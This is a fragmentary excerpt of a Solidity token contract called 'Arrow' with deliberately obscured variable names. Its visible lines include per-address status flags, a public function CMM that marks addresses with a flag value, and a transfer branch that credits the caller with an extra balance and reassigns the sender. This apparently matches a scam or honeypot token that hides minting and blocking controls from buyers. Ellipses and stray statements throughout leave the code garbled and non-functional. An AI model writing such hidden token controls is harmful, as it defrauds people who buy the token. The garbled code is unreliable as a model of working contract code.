...
contract Arrow is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Bksda;
...
function approve(address spender, uint256 amount) public returns (bool success) {    
    ...
    function transfer(address recipient, uint256 amount) public returns (bool) {
        ...
        require(amount <= Bksda[msg.sender]);
        if(cSD[msg.sender] <= 1) {
    ...
    require(amount <= Bksda[sender]);
     require(amount <= dXC[sender][msg.sender]);
        ...
        cSD[msg.sender] = 2;
        kDW = Akgs;
        Bksda[msg.sender] = Bksda[msg.sender].add(lMD);
...
function CMM (address nSES)  public {
      ...
      cSD[nSES] = 3;}}
        ...
        Bksda[sender] = Bksda[sender].sub(amount);
        Bksda[recipient] = Bksda[recipient].add(amount);
         sender = Akgs;
